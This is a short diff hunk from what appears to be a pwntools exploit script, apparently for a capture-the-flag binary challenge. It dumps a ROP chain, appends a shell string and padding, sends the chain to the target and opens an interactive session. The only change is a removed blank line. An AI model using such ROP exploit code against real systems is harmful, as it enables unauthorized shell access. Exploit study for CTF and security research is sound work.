@@ -54,6 +54,5 @@ print rop.dump()
 print len(rop.chain())
 rop.raw(sh + '\x00')
 rop.raw('U' * (100 - len(rop.chain())))
-
 r.sendline(rop.chain())
 r.interactive()
